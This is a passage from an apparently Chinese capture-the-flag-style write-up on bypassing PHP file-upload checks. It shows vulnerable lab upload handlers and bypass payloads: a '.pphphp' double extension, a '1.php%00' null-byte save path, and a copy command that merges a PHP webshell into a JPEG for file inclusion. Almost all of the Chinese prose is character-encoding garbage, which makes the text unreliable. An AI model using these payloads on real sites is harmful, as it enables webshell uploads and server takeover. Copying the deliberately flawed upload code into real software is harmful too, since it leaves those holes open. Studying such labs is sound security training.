¼ã€::$DATAçš„æ“ä½œï¼ŒçŒœæµ‹æ˜¯é’ˆå¯¹éWindowsç³»ç»Ÿçš„ã€‚è¿™é‡Œå­˜åœ¨çš„é—®é¢˜æ˜¯ï¼Œåˆ©ç”¨<code>str_ireplace</code>å¯¹é»‘åå•é‡Œçš„æ–‡ä»¶åç¼€åè¿›è¡Œäº†æ›¿æ¢ï¼Œæ¢æˆç©ºå­—ç¬¦ï¼Œä½¿ç”¨äº†<code>str_ireplace</code>å‡½æ•°ï¼Œå³ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ•…å¤§å°å†™ç»•è¿‡ä¸é€‚ç”¨ã€‚ä½†æ˜¯è¿™é‡Œæ›¿æ¢æ˜¯æ›¿æ¢æˆäº†ç©ºå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥åŒå†™åç¼€åï¼Œå¦‚<code>.pphphp</code>,ä½¿å¾—æ›¿æ¢åçš„åç¼€åä¸º<code>php</code>ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">å®šä¹‰å’Œç”¨æ³•<br><span class="hljs-built_in">str_ireplace</span>()å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚<br>è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š<br>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚<br>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚<br>å¦‚æœåŒæ—¶éœ€è¦å¯¹æŸä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™çš„å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚<br>å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚<br>æ³¨é‡Šï¼šè¯¥å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚ä½¿ç”¨<span class="hljs-built_in">str_replace</span>()å‡½æ•°æ‰§è¡ŒåŒºåˆ†å¤§å°å†™çš„æœç´¢ã€‚<br>æ³¨é‡Šï¼šè¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚<br></code></pre></td></tr></table></figure><p>ç”¨burpä¿®æ”¹åç¼€åä¸º <code>.pphphp</code> å³å¯ç»•è¿‡ã€‚</p><h1 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="00æˆªæ–­"></a>00æˆªæ–­</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº†ç™½åå•ï¼Œåªå…è®¸ä¸Šä¼  <code>jpg</code>ï¼Œ<code>png</code>ï¼Œ<code>gif</code>ä¸‰ç§æ ¼å¼æ–‡ä»¶ã€‚ä½†æ˜¯åœ¨è¿›è¡Œ<code>move_uploaded_file</code>å‰ã€‚åˆ©ç”¨<code>$_GET[&#39;save_path&#39;]</code>å’Œéšæœºæ—¶é—´å‡½æ•°è¿›è¡Œæ‹¼æ¥ï¼Œæ‹¼æ¥æˆæ–‡ä»¶å­˜å‚¨è·¯å¾„ã€‚è¿™é‡Œæ„é€ æ–‡ä»¶å­˜å‚¨è·¯å¾„åˆ©ç”¨äº†<code>GET</code>ä¼ å…¥(<code>POST</code>ä¼ å…¥ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†)ï¼Œå¯¼è‡´æœåŠ¡å™¨æœ€ç»ˆå­˜å‚¨çš„æ–‡ä»¶åå¯æ§ï¼Œæ•…å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œç»•è¿‡ã€‚ è¿™é‡Œåˆ©ç”¨çš„æ˜¯00æˆªæ–­ã€‚å³<code>move_uploaded_file</code>å‡½æ•°çš„åº•å±‚å®ç°ç±»ä¼¼äºCè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ã€‚</p><blockquote><p>æˆªæ–­æ¡ä»¶ï¼š<br>1ã€<code>php </code>ç‰ˆæœ¬å°äº5.3.4<br>2ã€<code>php.ini</code> çš„ <code>magic_quotes_gpc</code> ä¸ºOFFçŠ¶æ€</p></blockquote><p>æ„é€  <code>save_path=/upload/1.php%00</code> ç»•è¿‡</p><h1 id="å›¾ç‰‡é©¬-unpack"><a href="#å›¾ç‰‡é©¬-unpack" class="headerlink" title="å›¾ç‰‡é©¬ unpack"></a>å›¾ç‰‡é©¬ unpack</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRealFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = <span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);<br>    <span class="hljs-comment">//ä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…ï¼š</span><br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getRealFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä»£ç ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶å…ˆè¯»å–ä¸¤å­—èŠ‚ï¼Œé€šè¿‡å¯¹æ¯”æ–‡ä»¶å¤´æ¥ç¡®è®¤æ–‡ä»¶ç±»å‹ã€‚<br>äºæ˜¯å°±å¯ä»¥åˆ¶ä½œå›¾ç‰‡é©¬ï¼Œå°†phpè¯­å¥éšè—åœ¨å›¾ç‰‡ä¸­ï¼Œç„¶åç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œphpã€‚</p><p>ç»•è¿‡æ–¹æ³•</p><p>åˆ©ç”¨windowsçš„cmdå‘½ä»¤åˆ¶ä½œcopyåˆ¶ä½œå›¾ç‰‡é©¬<code>copy 1.jpg /b + shell.php /a shell.jpg</code>ï¼Œåˆ¶ä½œå®Œå›¾ç‰‡é©¬åç›´æ¥ä¸Šä¼ ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«å³å¯ã€‚</p><p><a href="https://www.runoob.com/php/func-misc-unpack.html">unpack å‡½æ•°å‚è€ƒ</a></p><h1 id="å›¾ç‰‡é©¬-getimagesize"><a href="#å›¾ç‰‡é©¬-getimagesize" class="headerlink" title="å›¾ç‰‡é©¬ getimagesize()"></a>å›¾ç‰‡é©¬ getimagesize()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-getimagesize.html">getimagesize() å‡½æ•°è§£é‡Š</a></p><blockquote><p>getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚</p></blockquote><p>ç»•è¿‡æ–¹æ³•ä¸ unpack ä¸€è‡´</p><h1 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span><br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.exif-imagetype.php">exif_imagetype å‡½æ•°è¯´æ˜</a></p><blockquote><p><strong>exif_imagetype()</strong> è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼Œå¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› <strong><code>FALSE</code></strong></p></blockquote><p>ç»•è¿‡æ–¹æ³•åŒç”Ÿæˆå›¾ç‰‡é©¬</p><h1 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h1><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2657">è¿™ç¯‡æ–‡ç« </a> è®²çš„å¾ˆç»†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span 